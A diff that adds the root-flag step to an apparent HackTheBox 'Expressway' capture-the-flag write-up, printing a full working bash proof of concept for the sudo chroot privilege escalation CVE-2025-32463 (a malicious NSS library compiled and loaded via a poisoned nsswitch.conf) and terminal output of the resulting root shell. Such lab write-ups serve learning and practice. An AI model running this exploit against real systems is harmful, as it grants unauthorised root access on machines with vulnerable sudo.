@@ -67,7 +67,57 @@ user-flag
 ```
 
 ### How to get the Root flag?
-Empty
+I still don't have a clear idea of how to gain root privilege. Anyway, the installed sudo version (1.9.17) is affected by a local privilege escalation (LPE) vulnerability. You can to use PoC to gain root privilege.
+```
+#!/bin/bash
+# sudo-chwoot.sh – PoC CVE-2025-32463
+set -e
+
+STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
+cd "$STAGE"
+
+# 1. NSS library
+cat > woot1337.c <<'EOF'
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor))
+void woot(void) {
+    setreuid(0,0);          /* change to UID 0 */
+    setregid(0,0);          /* change  to GID 0 */
+    chdir("/");             /* exit from chroot */
+    execl("/bin/bash","/bin/bash",NULL); /* root shell */
+}
+EOF
+
+# 2. Mini chroot with toxic nsswitch.conf
+mkdir -p woot/etc libnss_
+echo "passwd: /woot1337" > woot/etc/nsswitch.conf
+cp /etc/group woot/etc            # make getgrnam() not fail
+
+# 3. compile libnss_
+gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
+
+echo "[*] Running exploit…"
+sudo -R woot woot                 # (-R <dir> <cmd>)
+                                   # • the first “woot” is chroot
+                                   # • the second “woot” is and inexistent
+command
+                                   #   (only needs resolve the user)
+
+rm -rf "$STAGE"
+```
+#### Stage1. root privilege escalation
+```
+ike@expressway:~$ ./sudo-chwoot.sh 
+[*] Running exploit…
+root@expressway:/# id
+uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
+root@expressway:/# cd /root
+root@expressway:/root# cat root.txt 
+root-flag
+```
 
 ### Ref
 - Target : https://app.hackthebox.com/machines/Expressway
+- sudo exploit(CVE-2025-32463) : https://www.exploit-db.com/exploits/52352
